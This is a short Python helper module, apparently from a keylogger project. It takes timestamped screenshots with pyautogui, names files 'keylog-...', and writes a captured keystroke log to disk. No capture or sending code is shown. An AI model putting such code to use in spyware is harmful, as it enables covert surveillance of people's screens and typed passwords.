import os
from datetime import datetime

import pyautogui


def get_current_path():
    return os.getcwd().replace('\\', '/')


def take_screenshot(self):
    myScreenshot = pyautogui.screenshot()
    update_png_filename(self)
    print("saving -> {}".format(self.png_filename))
    screenshot = "{}/{}".format(self.screenshot_path, self.png_filename)
    self.files.append(screenshot)
    myScreenshot.save(screenshot)


def update_txt_filename(self):
    start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
    end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
    self.txt_filename = f"keylog-{start_dt_str}_{end_dt_str}"


def update_png_filename(self):
    dt_str = str(datetime.now()).replace(" ", "-").replace(":", "")
    self.png_filename = f"screenshot-{dt_str}.png"


def report_to_file(self):
    file_to_save = "{}/{}".format(self.log_path, self.txt_filename)
    with open(f"{file_to_save}.txt", "w") as f:
        print(self.log, file=f)
    print(f"[+] Saved {self.txt_filename}.txt")


def mkdir(folder):
    if not os.path.exists(folder):
        os.makedirs(folder)
